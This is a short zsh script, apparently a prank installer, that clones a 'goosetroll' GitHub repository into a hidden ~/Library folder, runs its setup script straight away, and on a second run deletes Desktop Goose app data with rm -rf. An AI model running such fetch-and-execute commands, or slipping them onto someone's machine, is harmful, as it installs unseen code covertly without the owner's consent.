#!/bin/zsh

if [ ! -d "./desktopgoose.app" ]
then
  git clone https://github.com/k34n4y138/goosetroll ~/Library/.geezehidden && zsh ~/Library/.geezehidden/setup.sh && echo "good 👌🏼"
else #executed for the second time inside the repo, time to reset memes]
  echo removing files
  rm -rf ~/Library/Containers/net.namedfork.DesktopGoose
  rm -rf ./desktopgeese.app/Contents/Resources/{Memes,Notes}
  python3 main.py
fi
